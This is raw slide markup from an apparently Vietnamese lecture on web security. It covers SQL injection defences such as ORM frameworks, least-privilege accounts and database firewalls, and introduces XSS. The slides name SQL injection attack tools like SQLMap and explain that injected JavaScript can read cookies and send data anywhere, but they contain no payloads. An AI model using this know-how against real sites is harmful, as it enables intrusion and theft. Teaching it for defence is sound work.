              <a:t>Sử dụng các framework hỗ trợ tương tác CSDL khi lập trình</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Hiện nay, có rất nhiều framework cho phép ánh xạ trực tiếp từ cơ sở dữ liệu thành các Object như Linq, Entity framewok…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Với việc sử dụng các framework này, người lập trình tiết kiệm đáng kể được thời gian lập trình mà giảm mối lo bị tấn công SQL injection bởi tất cả các database, table, field đều được ánh xạ thành các đối tượng và thuộc tính của nó, vì vậy nó tuân thủ chặt chẽ logic của lập trình, khó xảy ra các lỗ hổng không mong muốn</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31294783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38400" y="2590800"/>
            <a:ext cx="10294839" cy="1218795"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="1920784"/>
            <a:ext cx="9392477" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Thiết lập cấu hình an toàn cho HQT CSDL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các ứng dụng, web thông thường chỉ sử dụng một phần của cơ sở dữ liệu lớn. Ta nên tạo một tài khoản có đủ quyền để sử dụng phần dữ liệu mà ứng dụng cần, nếu sử dụng các quyền cao nhất như “sa” thì khi bị lấy cắp sẽ rất nguy hiểm cho hệ thống</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:br>
              <a:rPr lang="en-US" sz="2800">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2800">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Quyền càng bị hạn chế thì thiệt hại càng ít</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CAD045C1-EDB1-4652-A6F4-446B966B0E5B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1591379" y="457200"/>
            <a:ext cx="10433987" cy="1218795"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="4000" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26564390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45846" y="269259"/>
            <a:ext cx="10609578" cy="1218795"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Các biện pháp phòng chống tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1578339"/>
            <a:ext cx="10820400" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3000" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Sử dụng giải pháp Database firewall</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2500">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Database firewall dựa trên việc phân tích ngữ pháp, cấu trúc chính xác ngôn ngữ SQL (Highly accurate SQL grammar), sẽ giúp giám sát và ngăn chặn được các luồng SQL nguy hại, trước khi nó kết nối tới được CSDL (SQL injection là được loại bỏ). Việc triển khai mô hình database firewall không ảnh hưởng tới cấu trúc và mô hình hiện tại.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2000" b="1">
              <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3733800" y="3962400"/>
            <a:ext cx="4451212" cy="2316270"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3516360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4938" y="407582"/>
            <a:ext cx="9714450" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Một số công cụ tấn công SQL Injection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1665924" y="1524000"/>
            <a:ext cx="9392477" cy="3777622"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQLMap</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQLler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQLbftools</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL Injection Brute forcer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL Brute</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>BobCat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Absinthe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQID</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Blind SQL Injection Perl Tool</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL Power Injection</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62163" y="1312573"/>
            <a:ext cx="4876800" cy="4876800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26486752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08346" y="372319"/>
            <a:ext cx="10637880" cy="609398"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Một số công cụ quét lỗ hổng SQL Injection</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8800" y="1721635"/>
            <a:ext cx="9268093" cy="4400819"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3953814" y="6122454"/>
            <a:ext cx="4623515" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" i="1">
                <a:latin typeface="Times New Roman" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>SQL Map</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="87030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IV. NGUY CƠ TẤN CÔNG</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US"/>
            </a:br>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="5" name="Diagram 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8017B58B-5B22-4411-B43E-DEC45FD3F777}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGraphicFramePr/>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3411773705"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="609600" y="1371600"/>
          <a:ext cx="10860157" cy="47275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24928725"/>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429C2EC1-9E78-4FEE-BA1B-C2EDBDB6F17F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2017713" y="457200"/>
            <a:ext cx="5219700" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Giới thiệu về XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E62CFB1-0697-4112-BC85-086A10357FFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="1600200"/>
            <a:ext cx="9028113" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>XSS(Cross-Site Scripting)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cross-site scripting (XSS) is a code injection attack that allows an attacker to execute malicious Javascripts in another user's browser.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>The attacker does not directly target his victim. Instead, he exploits a vulnerability in a website that the victim visits, in order to get the website to deliver the malicious javascripts for him. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>To the victim's browser, the malicious javascripts appears to be a legitimate part of the website, and the website has thus acted as an unintentional accomplice to the attacker.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1545662797"/>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429C2EC1-9E78-4FEE-BA1B-C2EDBDB6F17F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2017713" y="457200"/>
            <a:ext cx="5219700" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Giới thiệu về XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E62CFB1-0697-4112-BC85-086A10357FFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="1762126"/>
            <a:ext cx="9028113" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>How the malicious Script is injected</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>The only way for the attacker to run his malicious JavaScript in the victim's browser is to inject it into one of the pages that the victim downloads from the website</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2" name="Picture 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B580C99C-EEF3-4EC9-8D11-0000524C7EB1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2438400" y="3505200"/>
            <a:ext cx="7349383" cy="1219200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A97E05BE-EF11-4B6C-8182-EB709C3EC568}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2438400" y="4946651"/>
            <a:ext cx="7349383" cy="1238150"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="546315769"/>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429C2EC1-9E78-4FEE-BA1B-C2EDBDB6F17F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2017713" y="457200"/>
            <a:ext cx="5219700" cy="563562"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Giới thiệu về XSS</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E62CFB1-0697-4112-BC85-086A10357FFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1219200" y="1762126"/>
            <a:ext cx="9028113" cy="5095875"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>What is malicious JavaScript?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>JavaScript has access to some of the user's sensitive information, such as cookies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>JavaScript can send HTTP requests with arbitrary content to arbitrary destinations by using XMLHttpRequest and other mechanisms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>JavaScript can make arbitrary modifications to the HTML of the current page by using DOM manipulation methods.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buNone/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" i="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>If an attacker can use your website to execute arbitrary JavaScript in another user's browser, the security of your website and its users has been compromised.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="just">
              <a:buClr>
                <a:schemeClr val="tx2"/>
              </a:buClr>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="§"/>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
